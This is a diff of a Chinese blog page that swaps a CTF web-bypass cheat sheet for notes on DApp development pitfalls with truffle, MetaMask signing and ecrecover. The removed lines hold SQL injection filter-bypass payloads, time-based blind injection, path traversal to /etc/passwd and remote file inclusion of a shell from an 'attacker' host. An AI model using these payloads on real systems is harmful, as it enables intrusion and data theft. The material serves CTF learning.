@@ -15,20 +15,18 @@
 
 
 
-<meta name="description" content="—  从零开始的笔记  —— sql，上传，目录  —">
-<meta name="keywords" content="web">
+<meta name="description" content="— 用时间砸出来的经验之谈 —— 记录下来、造福后Zi人Ji —">
+<meta name="keywords" content="智能合约,DAPP,血泪教训">
 <meta property="og:type" content="article">
-<meta property="og:title" content="WEB-CTF中的绕过">
-<meta property="og:url" content="http://lalajun.com/2017/10/19/WEB-CTF中的绕过/index.html">
+<meta property="og:title" content="DAPP开发中趟过的坑">
+<meta property="og:url" content="http://lalajun.com/2018/08/07/DAPP开发中趟过的坑/index.html">
 <meta property="og:site_name" content="啦啦菌NODE">
-<meta property="og:description" content="—  从零开始的笔记  —— sql，上传，目录  —">
+<meta property="og:description" content="— 用时间砸出来的经验之谈 —— 记录下来、造福后Zi人Ji —">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3gy1fqgxvtxg2nj30aq02r3yd.jpg">
-<meta property="og:updated_time" content="2018-05-06T07:50:57.162Z">
+<meta property="og:updated_time" content="2018-08-07T10:31:35.334Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="WEB-CTF中的绕过">
-<meta name="twitter:description" content="—  从零开始的笔记  —— sql，上传，目录  —">
-<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/006iKNp3gy1fqgxvtxg2nj30aq02r3yd.jpg">
+<meta name="twitter:title" content="DAPP开发中趟过的坑">
+<meta name="twitter:description" content="— 用时间砸出来的经验之谈 —— 记录下来、造福后Zi人Ji —">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -60,7 +58,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>WEB-CTF中的绕过 | 啦啦菌NODE</title>
+<title>DAPP开发中趟过的坑 | 啦啦菌NODE</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -277,11 +275,11 @@
     </div>
     <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
 </nav>
-      <div class="body-wrap"><article id="post-WEB-CTF中的绕过" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-DAPP开发中趟过的坑" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/10/19/WEB-CTF中的绕过/" class="article-date">
-      <time datetime="2017-10-19T08:51:11.000Z" itemprop="datePublished">2017-10-19</time>
+      <a href="/2018/08/07/DAPP开发中趟过的坑/" class="article-date">
+      <time datetime="2018-08-07T10:27:12.000Z" itemprop="datePublished">2018-08-07</time>
 </a>
 
 
@@ -296,7 +294,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      WEB-CTF中的绕过
+      DAPP开发中趟过的坑
     </h1>
   
 
@@ -307,7 +305,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/">web</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/DAPP/">DAPP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/智能合约/">智能合约</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/血泪教训/">血泪教训</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -317,80 +315,27 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>—  从零开始的笔记  —<br>— sql，上传，目录  —<br><a id="more"></a></p>
-<hr>
-<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><ul>
-<li>url base64 utf-8… (全部编码或个别编码)</li>
-<li>字符–&gt;char()<br><code>SELECT FROM Users WHERE username = CHAR(101,97,115,116)</code></li>
-<li>hex<br><code>SELECT password FROM Users WHERE username = 0x61646D696E</code></li>
-<li>%2527 -&gt; %27 -&gt; ‘ (绕过magic_quotes_gpc对于’的加/过滤，特定情况可以用吧)</li>
-</ul>
-<h3 id="重复"><a href="#重复" class="headerlink" title="重复"></a>重复</h3><p>admin  —&gt;  adadminmin<br>admin  —&gt;  adminadmin</p>
-<h3 id="大小写混用"><a href="#大小写混用" class="headerlink" title="大小写混用"></a>大小写混用</h3><p>SeLeT   不多解释</p>
-<h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><ul>
-<li>两个空格代替一个空格，TAB代替空格</li>
-<li>用注释符号代替空格 /<em>*/ /</em>.1<em>/ /</em>ddd*/ (ddd为无意义的字母)</li>
-<li>用括号代替空格  ()</li>
-<li>用+代替空格  </li>
-<li>%0a %a0 %20  %09  %0B %0C %0D </li>
-<li>用花括号代替空格 {}</li>
-</ul>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">#()</div><div class="line"><span class="keyword">select</span>(<span class="number">1</span>)</div><div class="line">#利用函数完成猜解  如：  猜解<span class="keyword">user</span>()第二个字符的<span class="keyword">ascii</span>码是不是<span class="number">109</span>，若是<span class="number">109</span>，则页面加载将延迟</div><div class="line"><span class="keyword">http</span>://www.xxx.com/index.php?<span class="keyword">id</span>=(<span class="keyword">sleep</span>(<span class="keyword">ascii</span>(<span class="keyword">mid</span>(<span class="keyword">user</span>()<span class="keyword">from</span>(<span class="number">2</span>)<span class="keyword">for</span>(<span class="number">1</span>)))=<span class="number">109</span>))</div><div class="line"># <span class="string">' "</span></div><div class="line"><span class="string">select'</span><span class="number">1</span><span class="string">'</span></div><div class="line"><span class="string">select"1"</span></div><div class="line"><span class="string"># &#123;&#125;</span></div><div class="line"><span class="string">select&#123;1&#125;</span></div></pre></td></tr></table></figure>
-<ul>
-<li>+代替空格  不是url编码空格的+而是直接的+ <code>select+user()</code></li>
-<li>单引号双引号代替空格  </li>
-</ul>
-<h3 id="过滤information-schema-tables等关键表名"><a href="#过滤information-schema-tables等关键表名" class="headerlink" title="过滤information_schema.tables等关键表名"></a>过滤information_schema.tables等关键表名</h3><ul>
-<li><code>select table_name from mysql.innodb_table</code> 不清楚何时起作用，起码我的mysql中没有innodb_table这个表</li>
-<li>information_schema . tables<br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fqgxvtxg2nj30aq02r3yd.jpg" alt=""></li>
-<li>/<em>!50000information_schema.tables</em>/</li>
-<li>尝试其他也包含库表信息的表<code>information_schema.key_column_usage/partitions/statistics/table_constraints</code></li>
-</ul>
-<h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤="></a>过滤=</h3><ul>
-<li>=用<a href="http://www.runoob.com/mysql/mysql-like-clause.html" target="_blank" rel="external">like</a>代替</li>
-<li>需要与零比较：<code>-1 or 1=1 and ord(substr(user(),1,1))-114</code></li>
-<li>substring(flag,1,1)in(‘a’) / substring(flag,1,1)in(0x97)</li>
-</ul>
-<h3 id="Mysql条件注释的利用"><a href="#Mysql条件注释的利用" class="headerlink" title="Mysql条件注释的利用  /*! ... */"></a>Mysql条件注释的利用  <code>/*! ... */</code></h3><ul>
-<li><code>/*! ... */</code>:其中的语句如果在其它数据库中是不会被执行，但在MYSQL中它会执行。</li>
-<li><code>/*!50000select*/</code>:50000版本以上的  不执行括号中的语句 ，必定执行，用于过滤正则表达式</li>
-<li><code>/*/* ... */</code></li>
-</ul>
-<h3 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h3><ul>
-<li><strong>limit ,</strong>中的<strong>,</strong> ：<a href="http://blog.csdn.net/keda8997110/article/details/8490895" target="_blank" rel="external">limit offset</a></li>
-<li>substr() mid()等函数中的<strong>,</strong> ：<code>select substr(database() from 1 for 1);</code></li>
-</ul>
-<h3 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h3><p>使用十六进制可以绕过引号<br>如：”users” —&gt; 0x7573657273</p>
-<h3 id="过滤-lt-与-gt"><a href="#过滤-lt-与-gt" class="headerlink" title="过滤&lt;与&gt;"></a>过滤&lt;与&gt;</h3><p>使用<a href="http://www.yiibai.com/sql/sql_function_greatest.html" target="_blank" rel="external">GREATEST()</a>绕过比较操作符。<br><code>select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</code> ——-&gt;<br><code>select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</code></p>
-<h3 id="过滤sleep"><a href="#过滤sleep" class="headerlink" title="过滤sleep"></a>过滤sleep</h3><p><a href="http://blog.sina.com.cn/s/blog_778e18e90101a48h.html" target="_blank" rel="external">benchmark(x, y)</a><br>benchmark(10000000,sha(1)) 1000次sha(1)，来时间延迟  </p>
-<h3 id="sleep中不能使用数字"><a href="#sleep中不能使用数字" class="headerlink" title="sleep中不能使用数字"></a>sleep中不能使用数字</h3><p>用pi()函数绕过<br><code>sleep(ceil(pi()))</code></p>
-<h3 id="过滤注释符号（-，–）"><a href="#过滤注释符号（-，–）" class="headerlink" title="过滤注释符号（#，–）"></a>过滤注释符号（#，–）</h3><ul>
-<li>id=1’ union select 1,2,3||’1</li>
-<li>id=1’ union select 1,2,’3</li>
-</ul>
-<h3 id="过滤单引号"><a href="#过滤单引号" class="headerlink" title="过滤单引号"></a>过滤单引号</h3><p>尝试宽字节    %bf%27 %df%27 %aa%27</p>
-<h3 id="过滤order-by"><a href="#过滤order-by" class="headerlink" title="过滤order by"></a>过滤order by</h3><p>当order by 被过滤后就可以使用into 变量来绕过<br><code>select * from yz limit 1,1 into @a,@b,@c;</code></p>
-<h3 id="利用等价函数"><a href="#利用等价函数" class="headerlink" title="利用等价函数"></a>利用等价函数</h3><ul>
-<li>hex()、bin() ==&gt; ascii()</li>
-<li>sleep() ==&gt; benchmark()</li>
-<li>concat_ws()==&gt; group_concat()</li>
-<li>mid()、substr() ==&gt; substring()</li>
-<li>@@user ==&gt; user()</li>
-<li>@@datadir ==&gt; datadir()</li>
-</ul>
-<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>随便提几个基础的：</p>
-<ul>
-<li>文件名限制      1.php.jpeg 可以在服务端使用php格式打开执行</li>
-<li>文件类型限制     burpsuite 修改image/jpeg</li>
-<li>文件大小限制     修改信息文件限制大小参数</li>
-<li>文件内容头部     修改文件内容头部<br>高端的，直接上<a href="http://blog.0kami.cn/2016/07/04/file-upload-vulnerability/" target="_blank" rel="external">0kami的博客</a> </li>
-</ul>
-<h2 id="文件包含及目录遍历"><a href="#文件包含及目录遍历" class="headerlink" title="文件包含及目录遍历"></a>文件包含及目录遍历</h2><p>两者应用相似，唯一不同就在于：前者是在url的<strong>参数</strong>中，后者是直接在url上</p>
-<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>– 0字节 \x00<br>(magic_quotes_gpc=off PHP小于5.3.4)<br><code>../../../../../../etc/passwd%00</code></p>
-<h3 id="长目录截断"><a href="#长目录截断" class="headerlink" title="长目录截断"></a>长目录截断</h3><p>利用操作系统对目录最大长度的限制<br>(php版本小于5.2.8(?) linux&gt;4096 windows&gt;256)<br><code>././././././././././././././././passwd././././././././././././././</code><br><code>////////////////////////passwd//////////////////////</code></p>
-<h3 id="点号截断"><a href="#点号截断" class="headerlink" title="点号截断"></a>点号截断</h3><p>(php版本小于5.2.8(?) 只适用windows 最后点号&gt;256)<br><code>?file=../../../../../../../../../boot.ini/………[…]…………</code></p>
-<h3 id="远程文件包含中的"><a href="#远程文件包含中的" class="headerlink" title="远程文件包含中的?"></a>远程文件包含中的<strong>?</strong></h3><p>远程文件包含本身参数传递的就是url地址，末尾加个<strong>？</strong>会把之后的系统后台添加的字符串理解为无用参数<br><code>/?param=http://attacker/phpshell.txt?</code><br><code>require_once &#39;http://attacker/phpshell.txt?/action/m_share.php&#39;;</code></p>
-<p>以上偷取葛大佬的部分栗子</p>
+        <p>— 用时间砸出来的经验之谈 —<br>— 记录下来、造福后Zi人Ji —<br><a id="more"></a></p>
+<h1 id="issue-amp-answer"><a href="#issue-amp-answer" class="headerlink" title="issue &amp; answer"></a>issue &amp; answer</h1><h2 id="TestRPC-Runtime-Error-out-of-gas"><a href="#TestRPC-Runtime-Error-out-of-gas" class="headerlink" title="TestRPC Runtime Error: out of gas"></a>TestRPC Runtime Error: out of gas</h2><p>解决：<a href="https://blog.csdn.net/loy_184548/article/details/78070279" target="_blank" rel="external">别人的博客</a></p>
+<h2 id="truffle-serve-——-fsevents-is-not-a-constructor"><a href="#truffle-serve-——-fsevents-is-not-a-constructor" class="headerlink" title="truffle serve ——  fsevents is not a constructor"></a>truffle serve ——  fsevents is not a constructor</h2><p>解决：<a href="https://github.com/trufflesuite/truffle/issues/448" target="_blank" rel="external">万能的Github</a></p>
+<h2 id="windows-cmd-运行truffle命令与truffle-js冲突"><a href="#windows-cmd-运行truffle命令与truffle-js冲突" class="headerlink" title="windows cmd 运行truffle命令与truffle.js冲突"></a>windows cmd 运行truffle命令与truffle.js冲突</h2><p>放弃windows <code>cmd</code>，乱七八糟问题多，用 <code>git bash</code></p>
+<h2 id="truffle-contract-链接-web3-1-0版本"><a href="#truffle-contract-链接-web3-1-0版本" class="headerlink" title="truffle-contract 链接 web3 1.0版本"></a>truffle-contract 链接 web3 1.0版本</h2><p>解决：<a href="https://github.com/trufflesuite/truffle-contract/issues/57" target="_blank" rel="external">万能的Github-1</a><br>解决：<a href="https://github.com/trufflesuite/truffle-contract/issues/56#issuecomment-331084530" target="_blank" rel="external">万能的Github-2</a></p>
+<p>最终解决代码如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//dirty hack for web3@1.0.0 support for localhost testrpc, see https://github.com/trufflesuite/truffle-contract/issues/56#issuecomment-331084530</span></div><div class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> self.contract.currentProvider.sendAsync !== <span class="string">"function"</span>) &#123;</div><div class="line">    self.contract.currentProvider.sendAsync = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> self.contract.currentProvider.send.apply(</div><div class="line">        self.contract.currentProvider, <span class="built_in">arguments</span></div><div class="line">    );</div><div class="line">    &#125;;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h2 id="metamask签名-智能合约中-验证签名-的坑"><a href="#metamask签名-智能合约中-验证签名-的坑" class="headerlink" title="metamask签名 智能合约中 验证签名 的坑"></a>metamask签名 智能合约中 验证签名 的坑</h2><p><strong>metamask</strong>中的web3 的 <strong>web3.eth.sign</strong> 与 <strong>web3.personal.sign</strong> 两种签名方式用同一账户地址对于同一数据的签名结果是不同的（我也完全不知道为什么啊啊啊啊！）<br>然后<strong>智能合约</strong>中用<code>ecrecover</code>进行验证</p>
+<p><code>web3.personal.sign(密文，签名地址，回调函数)</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">web3.personal.sign(<span class="string">"0x19cdf95a071009070a345dd7ffd30ee7f18eee008f4f5d49945c1e2328c53e9d"</span>,<span class="string">"0x18c61a12a369d91277ace3fd1c127a7f270d5d3b"</span>,<span class="built_in">console</span>.log)</div><div class="line"><span class="comment">//err + result</span></div><div class="line"><span class="comment">// null "0x1ed1a91cfb8fb0fe77d63f2f6fbf12f789bdcf88c11f8e4ffc023f2fd61e7c264b1c59a79668eb698902d0043b9a0a3ee16165d3d57dc0a29dde61de8e8e687d1b"</span></div></pre></td></tr></table></figure></p>
+<p><code>web3.eth.sign(签名地址,密文，回调函数)</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">web3.eth.sign(<span class="string">"0x18c61a12a369d91277ace3fd1c127a7f270d5d3b"</span>,</div><div class="line"><span class="string">"0x19cdf95a071009070a345dd7ffd30ee7f18eee008f4f5d49945c1e2328c53e9d"</span>,<span class="built_in">console</span>.log)</div><div class="line"><span class="comment">//err + result</span></div><div class="line"><span class="comment">// null "0x541959986ccc60b5a5ba5bf90535b5e1d372972413306df4d67c6224f79e585e4ff598da3c700965a70ff204ded769b3261ff67214b2d4fa955ee3dbaad76a301b"</span></div></pre></td></tr></table></figure></p>
+<p>js中进行分解signature<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> signature = req.query.signature.slice(<span class="number">2</span>,<span class="number">132</span>) <span class="comment">//去除0x</span></div><div class="line"><span class="keyword">var</span> r = <span class="string">"0x"</span>+signature.slice(<span class="number">0</span>,<span class="number">64</span>);</div><div class="line"><span class="keyword">var</span> s = <span class="string">"0x"</span>+signature.slice(<span class="number">64</span>,<span class="number">128</span>);</div><div class="line"><span class="keyword">var</span> v = <span class="built_in">parseInt</span>(signature.slice(<span class="number">128</span>,<span class="number">130</span>),<span class="number">16</span>);  <span class="comment">//转为int形式 ，此处产生的v 直接就为27或28</span></div></pre></td></tr></table></figure></p>
+<p>智能合约中的<code>ecrecover</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//uint8 v, bytes32 r, bytes32 s</span></div><div class="line">address addr = ecrecover(hashOfMsg, v, r, s);</div></pre></td></tr></table></figure></p>
+<blockquote>
+<p>关键的来了！<br>智能合约中的<code>ecrecover</code>是识别metamask中的web3.eth.sign<br>而不识别web3.personal.sign!!!!!!!!!!!!<br>不识别的意思是验证时，结果不一样！</p>
+</blockquote>
+<p>结论：<strong>智能合约中的<code>ecrecover</code>是识别metamask中的web3.eth.sign</strong></p>
+<h2 id="智能合约与JS中的sha256"><a href="#智能合约与JS中的sha256" class="headerlink" title="智能合约与JS中的sha256"></a>智能合约与JS中的sha256</h2><p>当在在智能合约中用到的<code>ecrecover(hashOfMsg, v, r, s)</code></p>
+<p>智能合约中的<code>sha256(address)</code>。address是作为bytes进行sha256；<br>在js中的<code>sha256(&quot;0x123&quot;)</code>是作为字符串形式进行sha256。</p>
+<p>两者的结果不同，如果需要相同，需要在js中修改<code>&quot;0x123&quot;</code>为bytes形式进行sha256</p>
+<h2 id="truffle寻找合约地址"><a href="#truffle寻找合约地址" class="headerlink" title="truffle寻找合约地址"></a>truffle寻找合约地址</h2><p>如何在truffle中找到部署合约的合约地址？</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> Web3 = <span class="built_in">require</span>(<span class="string">'web3'</span>);</div><div class="line"><span class="keyword">var</span> contract = <span class="built_in">require</span>(<span class="string">'truffle-contract'</span>);</div><div class="line"><span class="comment">//引入合约 以及 配置</span></div><div class="line"><span class="keyword">var</span> ConContract = <span class="built_in">require</span>(<span class="string">'../../contracts/Coin.json'</span>);</div><div class="line"><span class="comment">//链接到以太坊节点</span></div><div class="line"><span class="keyword">var</span> web3 = <span class="keyword">new</span> Web3(<span class="keyword">new</span> Web3.providers.HttpProvider(<span class="string">'http://localhost:7545'</span>));</div><div class="line"><span class="keyword">const</span> Cont = &#123;</div><div class="line">    <span class="comment">//地址</span></div><div class="line">    contract: <span class="literal">null</span>,</div><div class="line">    <span class="comment">//合约</span></div><div class="line">    instance: <span class="literal">null</span>,</div><div class="line"></div><div class="line">    <span class="comment">//初始化链接到以太坊节点</span></div><div class="line">    init: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="keyword">let</span> self = <span class="keyword">this</span></div><div class="line"></div><div class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</div><div class="line">        self.contract = contract(ConContract)</div><div class="line">        self.contract.setProvider(web3.currentProvider)</div><div class="line">        self.contract.deployed().then(<span class="function"><span class="params">instance</span> =&gt;</span> &#123;</div><div class="line">            self.instance = instance</div><div class="line">            resolve()</div><div class="line">        &#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</div><div class="line">            reject(err)</div><div class="line">        &#125;)</div><div class="line">        &#125;)</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="built_in">module</span>.exports = Cont;</div></pre></td></tr></table></figure>
+<p>如此初始化合约，合约地址在<code>Cont.instance.address</code></p>
 
       
     </div>
@@ -399,13 +344,13 @@
   
     
     <div class="copyright">
-        <p><span>Title:</span><a href="/2017/10/19/WEB-CTF中的绕过/">WEB-CTF中的绕过</a></p>
+        <p><span>Title:</span><a href="/2018/08/07/DAPP开发中趟过的坑/">DAPP开发中趟过的坑</a></p>
         <p><span>Author:</span><a href="/" title="Back to Homepage">LaLa</a></p>
-        <p><span>Created:</span>2017-10-19, 16:51:11</p>
-        <p><span>Updated:</span>2018-05-06, 15:50:57</p>
+        <p><span>Created:</span>2018-08-07, 18:27:12</p>
+        <p><span>Updated:</span>2018-08-07, 18:31:35</p>
         <p>
-            <span>Full URL:</span><a class="post-url" href="/2017/10/19/WEB-CTF中的绕过/" title="WEB-CTF中的绕过">http://lalajun.com/2017/10/19/WEB-CTF中的绕过/</a>
-            <span class="copy-path" data-clipboard-text="From http://lalajun.com/2017/10/19/WEB-CTF中的绕过/　　By LaLa" title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
+            <span>Full URL:</span><a class="post-url" href="/2018/08/07/DAPP开发中趟过的坑/" title="DAPP开发中趟过的坑">http://lalajun.com/2018/08/07/DAPP开发中趟过的坑/</a>
+            <span class="copy-path" data-clipboard-text="From http://lalajun.com/2018/08/07/DAPP开发中趟过的坑/　　By LaLa" title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -417,16 +362,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2017/12/05/WEB-CTF中的SQL文件操作/">
-                    WEB-CTF中的SQL文件操作
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2017/09/24/WEB-CTF中的sql盲注/">
-                    WEB-CTF中的sql盲注
+                <a href="/2018/08/07/truffle_contact/">
+                    Truffle-Contract中间件
                 </a>
             </div>
         
@@ -438,7 +377,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql注入"><span class="toc-text">sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#编码"><span class="toc-text">编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#重复"><span class="toc-text">重复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#大小写混用"><span class="toc-text">大小写混用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤空格"><span class="toc-text">过滤空格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤information-schema-tables等关键表名"><span class="toc-text">过滤information_schema.tables等关键表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤"><span class="toc-text">过滤=</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mysql条件注释的利用"><span class="toc-text">Mysql条件注释的利用  /*! ... */</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤逗号"><span class="toc-text">过滤逗号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤引号"><span class="toc-text">过滤引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤-lt-与-gt"><span class="toc-text">过滤<与></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤sleep"><span class="toc-text">过滤sleep</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sleep中不能使用数字"><span class="toc-text">sleep中不能使用数字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤注释符号（-，–）"><span class="toc-text">过滤注释符号（#，–）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤单引号"><span class="toc-text">过滤单引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#过滤order-by"><span class="toc-text">过滤order by</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用等价函数"><span class="toc-text">利用等价函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件上传"><span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件包含及目录遍历"><span class="toc-text">文件包含及目录遍历</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#00截断"><span class="toc-text">%00截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#长目录截断"><span class="toc-text">长目录截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#点号截断"><span class="toc-text">点号截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程文件包含中的"><span class="toc-text">远程文件包含中的?</span></a></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#issue-amp-answer"><span class="toc-text">issue & answer</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#TestRPC-Runtime-Error-out-of-gas"><span class="toc-text">TestRPC Runtime Error: out of gas</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#truffle-serve-——-fsevents-is-not-a-constructor"><span class="toc-text">truffle serve ——  fsevents is not a constructor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows-cmd-运行truffle命令与truffle-js冲突"><span class="toc-text">windows cmd 运行truffle命令与truffle.js冲突</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#truffle-contract-链接-web3-1-0版本"><span class="toc-text">truffle-contract 链接 web3 1.0版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#metamask签名-智能合约中-验证签名-的坑"><span class="toc-text">metamask签名 智能合约中 验证签名 的坑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#智能合约与JS中的sha256"><span class="toc-text">智能合约与JS中的sha256</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#truffle寻找合约地址"><span class="toc-text">truffle寻找合约地址</span></a></li></ol></li></ol>
         
     </div>
     <style>
@@ -469,15 +408,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/12/05/WEB-CTF中的SQL文件操作/" title="Pre: WEB-CTF中的SQL文件操作">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="Back to Homepage"><i class="fa fa-home"></i></a>
         
 
         <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2017/09/24/WEB-CTF中的sql盲注/" title="Next: WEB-CTF中的sql盲注">
+            <a href="/2018/08/07/truffle_contact/" title="Next: Truffle-Contract中间件">
                 <i class="fa fa-angle-right"></i>
             </a>
         
